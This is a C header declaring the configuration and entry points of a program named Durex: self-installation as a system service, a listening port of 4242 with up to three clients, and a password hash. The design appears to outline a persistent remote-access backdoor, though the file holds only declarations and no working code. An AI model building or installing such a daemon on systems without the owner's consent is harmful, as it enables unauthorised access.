#ifndef DUREX_H
#define DUREX_H

#include <stddef.h>

#define DUREX_DEFAULT_PORT 4242
#define DUREX_MAX_CLIENTS 3
#define DUREX_PASSWORD_HASH_LENGTH 64

typedef struct s_durex_config
{
    int         allow_non_root;
    int         is_64bit;
    const char *prefix;
    const char *binary_path;
    const char *service_path;
    const char *pid_path;
    const char *log_path;
    const char *service_name;
    int         port;
    char        password_hash[DUREX_PASSWORD_HASH_LENGTH + 1];
}   t_durex_config;

int     durex_load_config(t_durex_config *cfg, const char *self_path);
int     durex_install(const t_durex_config *cfg, const char *self_path);
int     durex_run(const t_durex_config *cfg, char *const argv[]);

#endif
